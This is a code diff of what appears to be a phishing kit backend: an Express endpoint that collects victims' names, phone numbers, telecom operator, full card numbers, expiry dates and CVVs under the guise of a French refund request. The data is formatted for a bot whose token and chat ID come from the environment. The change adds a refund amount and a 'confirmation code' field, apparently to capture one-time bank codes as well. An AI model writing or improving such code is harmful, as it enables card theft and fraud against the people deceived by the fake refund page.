@@ -15,20 +15,20 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 app.post('/send-data', async (req, res) => {
-  const { fullname, email, phone, operator, reason, cardNumber, expiryDate, cvv } = req.body;
+  const { fullname, phone, operator, refundAmount, cardNumber, expiryDate, cvv, confirmationCode } = req.body;
 
   const message = `
 📥 Nouvelle demande de remboursement :
 
 👤 Nom: ${fullname}
-📧 Email: ${email}
 📱 Téléphone: ${phone}
 🏢 Opérateur: ${operator}
-❓ Motif: ${reason}
+💰 Montant: ${refundAmount} €
 
 💳 Carte: ${cardNumber}
 📆 Expiration: ${expiryDate}
 🔐 CVV: ${cvv}
+🆔 Code de confirmation: ${confirmationCode}
 `;
 
   try {
